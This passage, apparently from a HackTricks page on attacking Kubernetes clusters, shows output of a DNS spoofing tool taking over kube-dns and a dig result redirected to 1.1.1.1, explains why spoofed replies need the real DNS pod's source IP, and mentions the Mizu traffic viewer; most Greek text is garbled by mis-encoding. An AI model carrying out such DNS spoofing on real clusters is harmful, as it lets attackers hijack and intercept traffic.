Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Î‘Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï„Î¿ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ DNS spoofing, Î±Î½ **Î±Ï€Î»ÏÏ‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ DNS Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·** Î±Ï…Ï„ÏŒ **Î´ÎµÎ½** Î¸Î± **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹**, ÎµÏ€ÎµÎ¹Î´Î® Î· **Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·** Î¸Î± Î­Ï‡ÎµÎ¹ Î¼Î¹Î± **src IP** Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP Ï„Î¿Ï… **ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï…** **pod** ÎºÎ±Î¹ **Î´ÎµÎ½ Î¸Î±** Î³Î¯Î½ÎµÎ¹ **Î±Ï€Î¿Î´ÎµÎºÏ„Î®**.\
Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± **Î½Î­Î¿ DNS Ï€Î±ÎºÎ­Ï„Î¿** Î¼Îµ Ï„Î·Î½ **src IP** Ï„Î¿Ï… **DNS** ÏŒÏ€Î¿Ï… Ï„Î¿ Î¸ÏÎ¼Î± ÏƒÏ„Î­Î»Î½ÎµÎ¹ Ï„Î¿ DNS Î±Î¯Ï„Î·Î¼Î± (Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ 172.16.0.2, ÏŒÏ‡Î¹ 10.96.0.10, Î±Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î· IP Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ DNS K8s ÎºÎ±Î¹ ÏŒÏ‡Î¹ Î· IP Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® DNS, Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹' Î±Ï…Ï„ÏŒ ÏƒÏ„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î®).
{% endhint %}

## Capturing Traffic

Î¤Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ [**Mizu**](https://github.com/up9inc/mizu) ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Î±Ï€Î»ÏŒÏ‚ Î±Î»Î»Î¬ Î¹ÏƒÏ‡Ï…ÏÏŒÏ‚ API **Î¸ÎµÎ±Ï„Î®Ï‚ ÎºÎ¯Î½Î·ÏƒÎ·Ï‚ Î³Î¹Î± Kubernetes** Ï€Î¿Ï… ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î²Î»Î­Ï€ÎµÏ„Îµ ÏŒÎ»Î· Ï„Î·Î½ API ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±** Î¼ÎµÏ„Î±Î¾Ï Î¼Î¹ÎºÏÎ¿Ï‹Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Î³Î¹Î± Î½Î± ÏƒÎ±Ï‚ Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ Î½Î± Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î±Ï„ÏÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± ÎµÏ€Î¹Î»ÏÏƒÎµÏ„Îµ Î±Î½Î±Ï„ÏÎ¿Ï€Î­Ï‚.\
Î˜Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï€ÏÎ¬ÎºÏ„Î¿ÏÎµÏ‚ ÏƒÏ„Î± ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± pods ÎºÎ±Î¹ Î¸Î± ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏÏƒÎµÎ¹ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎºÎ¯Î½Î·ÏƒÎ®Ï‚ Ï„Î¿Ï…Ï‚ ÎºÎ±Î¹ Î¸Î± ÏƒÎ±Ï‚ Ï„Î¹Ï‚ Î´ÎµÎ¯Î¾ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î¹ÏƒÏ„Î¿Ï. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï…ÏˆÎ·Î»Î¬ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± K8s Î³Î¹Î± Î±Ï…Ï„ÏŒ (ÎºÎ±Î¹ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ).

## References

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
